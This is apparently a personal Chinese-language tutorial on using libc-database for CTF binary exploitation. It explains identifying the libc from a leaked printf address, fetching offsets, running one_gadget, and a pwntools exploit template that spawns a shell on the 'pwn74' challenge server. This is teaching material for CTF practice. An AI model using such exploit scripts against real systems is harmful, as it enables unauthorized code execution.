---
title: "libc-database 使用说明"
lastmod: 2026-04-16T22:17:20+08:00
draft: false
---
## 1. 安装位置

已经在 Kali 上安装 `libc-database`：

```bash
/home/kali/tools/libc-database
```

也已经给 shell 加了别名，新开 Kali 终端后可以直接输入：

```bash
libcdb
```

等价于：

```bash
cd /home/kali/tools/libc-database
```

工具来源：

```bash
https://github.com/niklasb/libc-database
```

当前工具本体已经下载完成。数据库拉取比较耗时，我尝试拉了 `ubuntu` 分类，已经有一部分数据；如果查询结果不完整，按下面的命令继续拉全量或指定分类。

## 2. 什么时候用 libc-database

当题目泄露了 libc 里的函数真实地址，但没有给 `libc.so.6` 时，可以用它反查 libc 版本。

常见泄露：

```text
printf
puts
read
write
__libc_start_main
```

比如 pwn74 会打印：

```text
What's this:0x7fxxxxxxxxxx ?
```

这里泄露的是 `printf` 在远程进程中的真实地址。

## 3. 为什么只用低 12 位

ASLR 会随机 libc 基址，但 libc 基址通常按 `0x1000` 对齐。

所以：

```text
printf_runtime_addr & 0xfff == printf_offset_in_libc & 0xfff
```

也就是说，只知道一个泄露地址时，最常用的是取低 12 位去查。

Python 计算：

```python
printf_addr = 0x7ffff7e12340
print(hex(printf_addr & 0xfff))
```

如果输出：

```text
0x340
```

那么就用：

```bash
./find printf 340
```

## 4. 初始化数据库

进入工具目录：

```bash
cd /home/kali/tools/libc-database
```

查看可下载分类：

```bash
./get
```

常用分类：

```bash
./get ubuntu
./get debian
./get kali
./get ubuntu debian
```

全量下载：

```bash
./get all
```

注意：`./get all` 很耗时，也比较占空间。做 CTF 一般先拉：

```bash
./get ubuntu debian
```

如果目标是 Kali 本地环境，再拉：

```bash
./get kali
```

## 5. 根据 printf 地址查 libc

假设远程泄露：

```text
printf_addr = 0x7ffff7e12340
```

先算低 12 位：

```python
printf_addr = 0x7ffff7e12340
print(hex(printf_addr & 0xfff))
```

得到：

```text
0x340
```

进入工具目录查询：

```bash
cd /home/kali/tools/libc-database
./find printf 340
```

如果查到，会输出类似：

```text
ubuntu-glibc (libc6_2.27-3ubuntu1_amd64)
archive-glibc (libc6_2.23-0ubuntu11_amd64)
```

括号里的内容就是 libc ID，例如：

```text
libc6_2.27-3ubuntu1_amd64
```

## 6. 多个候选怎么办

只泄露一个函数时，经常会查出多个候选。因为低 12 位信息太少。

如果能泄露两个函数，查询会准很多：

```bash
./find printf 340 puts 5a0
```

或者：

```bash
./find printf 340 read 250
```

多个符号的格式是：

```bash
./find 函数1 低12位 函数2 低12位 函数3 低12位
```

如果题目只能泄露一个 `printf`，常见做法是：

1. 用 `./find printf xxx` 找候选。
2. 分别下载候选 libc。
3. 对每个候选跑 `one_gadget`。
4. 逐个尝试 one_gadget 偏移。

## 7. 下载候选 libc

假设候选 ID 是：

```text
libc6_2.27-3ubuntu1_amd64
```

下载完整 libc：

```bash
cd /home/kali/tools/libc-database
./download libc6_2.27-3ubuntu1_amd64
```

下载后文件一般在：

```bash
libs/libc6_2.27-3ubuntu1_amd64/
```

查看：

```bash
ls libs/libc6_2.27-3ubuntu1_amd64/
```

常见文件：

```text
libc.so.6
ld-linux-x86-64.so.2
libpthread.so.0
```

## 8. 查看 libc 常用偏移

```bash
./dump libc6_2.27-3ubuntu1_amd64
```

它会输出类似：

```text
offset_system = 0x0004f550
offset_printf = 0x00064e80
offset_puts = 0x000809c0
offset_str_bin_sh = 0x1b3e1a
```

也可以 grep：

```bash
./dump libc6_2.27-3ubuntu1_amd64 | grep printf
./dump libc6_2.27-3ubuntu1_amd64 | grep system
./dump libc6_2.27-3ubuntu1_amd64 | grep str_bin_sh
```

当然，也存在找不到不是常用的函数的时候

这个时候你就能使用readelf来查看这个偏移值

```
readelf -sw libs/libc6-amd64_2.27-3ubuntu1_i386/libc.so.6 | grep printf
```
## 9. 配合 one_gadget

下载候选 libc 后，对它跑：

```bash
one_gadget libs/libc6_2.27-3ubuntu1_amd64/libc.so.6
```

输出类似：

```text
0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

这里的：

```text
0x4f2a5
0x10a2fc
```

就是 one_gadget 偏移。

真实跳转地址：

```python
one = libc_base + one_gadget_offset
```

## 10. pwn74 使用流程

pwn74 程序逻辑是：

```text
打印 printf 真实地址
scanf("%ld", &addr)
call addr
```

所以流程：

1. 接收远程打印的 `printf` 地址。
2. 用 `printf` 低 12 位查 libc。
3. 下载候选 libc。
4. 用候选 libc 计算 `libc_base`。
5. 跑 `one_gadget` 得到偏移。
6. 发送 `libc_base + one_gadget_offset`。

脚本模板：

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

io = remote("pwn.challenge.ctf.show", 端口)
libc = ELF("./libc.so.6")

io.recvuntil(b"What's this:")
printf_addr = int(io.recvuntil(b" ?").strip(b" ?"), 16)

libc_base = printf_addr - libc.sym["printf"]
one = libc_base + 0x10a2fc

log.success(f"printf: {hex(printf_addr)}")
log.success(f"libc_base: {hex(libc_base)}")
log.success(f"one_gadget: {hex(one)}")

# pwn74 是 scanf("%ld")，所以发送十进制
io.sendline(str(one).encode())
io.interactive()
```

注意：

```python
io.sendline(str(one).encode())
```

不要写成：

```python
io.sendline(hex(one).encode())
```

因为程序格式是 `%ld`，默认读十进制整数。

## 11. 如果只有 printf 一个泄露

只有一个 `printf` 泄露时，可能出现多个候选 libc。这时有三种处理：

### 方案一：逐个候选试

```bash
./find printf 340
./download 候选ID1
one_gadget libs/候选ID1/libc.so.6

./download 候选ID2
one_gadget libs/候选ID2/libc.so.6
```

然后把不同 one_gadget 偏移逐个填进 exploit。

### 方案二：继续找更多泄露

如果程序还能泄露 `puts/read/write` 等，再用多个符号查询：

```bash
./find printf 340 puts 5a0
```

### 方案三：用在线库交叉验证

本地工具查不到时，可以用：

```text
https://libc.rip/
https://libc.blukat.me/
```

查到 ID 后，再回到本地：

```bash
./download libc_id
one_gadget libs/libc_id/libc.so.6
```

## 12. 常用命令汇总

```bash
# 进入工具目录
cd /home/kali/tools/libc-database

# 查看可下载分类
./get

# 下载常用数据库
./get ubuntu debian

# 根据 printf 低 12 位查 libc
./find printf 340

# 多符号查询
./find printf 340 puts 5a0 read 250

# 下载候选 libc
./download libc6_2.27-3ubuntu1_amd64

# 查看偏移
./dump libc6_2.27-3ubuntu1_amd64

# 跑 one_gadget
one_gadget libs/libc6_2.27-3ubuntu1_amd64/libc.so.6
```

## 13. 小抄

```text
泄露地址 -> 取低 12 位 -> ./find 查候选 -> ./download 下载 libc -> one_gadget 算偏移
```

Python 取低 12 位：

```python
print(hex(addr & 0xfff))
```

算 libc 基址：

```python
libc_base = leaked_printf - libc.sym["printf"]
```

算 one_gadget 真实地址：

```python
one = libc_base + one_gadget_offset
```

发送给 pwn74：

```python
io.sendline(str(one).encode())
```

